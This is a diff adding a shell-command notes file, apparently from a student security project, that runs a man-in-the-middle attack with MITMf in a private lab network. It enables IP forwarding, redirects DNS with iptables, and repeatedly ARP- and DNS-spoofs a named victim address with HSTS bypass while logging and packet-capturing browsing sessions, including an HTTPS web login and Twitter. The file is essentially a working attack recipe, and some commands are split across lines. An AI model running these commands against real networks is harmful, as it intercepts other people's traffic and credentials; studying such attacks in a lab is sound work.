@@ -1,0 +1,55 @@
+#MITMF SCRIPT
+
+iptables -A INPUT -i eth1 -p udp --dport 53 -j ACCEPT
+iptables -A PREROUTING -t nat -i eth1 -p udp --dport 53 -j REDIRECT --to-port 53
+
+ip-attacker 192.168.2.12
+ip-victim 192.168.2.7
+gateway 192.168.2.254
+
+netdiscover -i eth1 -r 192.168.2.0/16
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+nano /root/MITMf/config/mitmf.conf
+
+cat > ./logs/mitmf.log 
+python mitmf.py -i eth1 --spoof --arp --dns --target 192.168.2.7 --gateway 192.168.2.254 --hsts
+cp ./logs/mitmf.log  ~/Desktop/security-project/dns-spoofing/mitmf/explorer-http-perros.log
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/mitmf/tcp-dump-explorer-http-perros.pcap
+ -i eth1 host 192.168.2.7
+
+cat > ./logs/mitmf.log 
+python mitmf.py -i eth1 --spoof --arp --dns --target 192.168.2.7 --gateway 192.168.2.254 --hsts
+cp ./logs/mitmf.log  ~/Desktop/security-project/dns-spoofing/mitmf/explorer-https-web-login.log
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/mitmf/tcp-dump-explorer-https-web-login.pcap
+ -i eth1 host 192.168.2.7
+
+cat > ./logs/mitmf.log 
+python mitmf.py -i eth1 --spoof --arp --dns --target 192.168.2.7 --gateway 192.168.2.254 --hsts
+cp ./logs/mitmf.log  ~/Desktop/security-project/dns-spoofing/mitmf/explorer-twitter.log
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/mitmf/tcp-dump-explorer-twitter.pcap
+ -i eth1 host 192.168.2.7
+
+cat > ./logs/mitmf.log 
+python mitmf.py -i eth1 --spoof --arp --dns --target 192.168.2.7 --gateway 192.168.2.254 --hsts
+cp ./logs/mitmf.log  ~/Desktop/security-project/dns-spoofing/mitmf/firefox-http-perros.log
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/mitmf/tcp-dump-firefox-http-perros.pcap
+ -i eth1 host 192.168.2.7
+
+cat > ./logs/mitmf.log 
+python mitmf.py -i eth1 --spoof --arp --dns --target 192.168.2.7 --gateway 192.168.2.254 --hsts
+cp ./logs/mitmf.log  ~/Desktop/security-project/dns-spoofing/mitmf/firefox-https-web-login.log
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/mitmf/tcp-dump-firefox-https-web-login.pcap
+ -i eth1 host 192.168.2.7
+
+cat > ./logs/mitmf.log 
+python mitmf.py -i eth1 --spoof --arp --dns --target 192.168.2.7 --gateway 192.168.2.254 --hsts
+cp ./logs/mitmf.log  ~/Desktop/security-project/dns-spoofing/mitmf/firefox-twitter.log
+
+tcpdump -w ~/Desktop/security-project/dns-spoofing/mitmf/tcp-dump-firefox-twitter.pcap -i eth1 host 192.168.2.7
+
